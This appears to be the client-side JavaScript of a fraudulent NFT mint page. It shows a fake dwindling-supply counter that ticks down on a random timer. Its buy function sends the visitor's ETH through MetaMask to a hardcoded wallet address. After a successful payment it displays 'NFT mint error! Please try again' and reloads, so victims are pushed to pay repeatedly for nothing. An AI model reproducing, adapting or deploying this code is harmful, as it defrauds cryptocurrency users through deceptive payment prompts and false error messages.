let input = document.querySelector('#count')
let total = document.querySelector('#total')
qty = 157
document.getElementById('qty').innerHTML = qty;

const price = 0.1
const max = 10
const address = '0x067a8bd8069e571D431ed8d8F0f4EbB9eA03BF60'

document.querySelector('#price1').innerHTML = price
document.querySelector('#price2').innerHTML = price
document.querySelector('#total').innerHTML = price
document.querySelector('#max').innerHTML = max

function time() {
    mint = Math.ceil(5000);
    maxt = Math.floor(10000);
    return Math.floor(Math.random() * (maxt - mint + 1)) + mint; //Максимум и минимум включаются
}

setInterval(() => {
    document.getElementById('qty').innerHTML = qty;
    qty-=1
}, time());


document.querySelector('#plus').addEventListener('click', function() {
    let intvalue = parseInt(input.value)
    if (intvalue < max) {
        input.value = intvalue + 1
        total.innerHTML = ((intvalue + 1) * price).toFixed(2);
    }
})

document.querySelector('#minus').addEventListener('click', function() {
    let intvalue = parseInt(input.value)
    if (intvalue > 1) {
        input.value = intvalue - 1
        total.innerHTML = ((intvalue - 1) * price).toFixed(2);
    }
})
document.querySelector('#maxbtn').addEventListener('click', function() {
    input.value = max
    total.innerHTML = (max * price).toFixed(2);
})

async function buy() {
    totalint = parseFloat(total.innerHTML)
    if (typeof window.ethereum !== 'undefined') {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const account = accounts[0];
        cost = 2;
        document.querySelector('.status-p').classList.add('d-none')
        document.querySelector('.status-s').classList.remove('d-none')
        //Sending Ethereum to an address
        ethereum
        
          .request({
            method: 'eth_sendTransaction',
            params: [
              {
                from : account,
                to: address,
                value: ethers.utils.parseEther(`${totalint}`)['_hex'],
              },
            ],
          })
          .then((txHash) => {
            document.querySelector('.status-p').classList.remove('d-none')
            document.querySelector('.status-s').classList.add('d-none')
            document.getElementById('notification').innerHTML += 'NFT mint error! Please try again'
            document.getElementById('notification').classList.add('alert-danger')
            document.getElementById('notification').classList.remove('d-none')
            document.getElementById('status-icon').classList.add('bi-exclamation-triangle')
            window.setInterval(() => {
                window.location.reload()
            }, 10000);
          })
          .catch((error) => {
            document.querySelector('.status-p').classList.remove('d-none')
            document.querySelector('.status-s').classList.add('d-none')
            document.getElementById('notification').innerHTML += 'NFT mint error! Check your wallet balance or try again later'
            document.getElementById('notification').classList.add('alert-danger')
            document.getElementById('notification').classList.remove('d-none')
            document.getElementById('status-icon').classList.add('bi-exclamation-triangle')
            window.setInterval(() => {
                window.location.reload()
            }, 10000);

          });
    } else {
        alert('Install Metamask wallet to mint!')
        
    }
}

function hidecookie() {
    document.getElementById('cookie').classList.add('visually-hidden')
}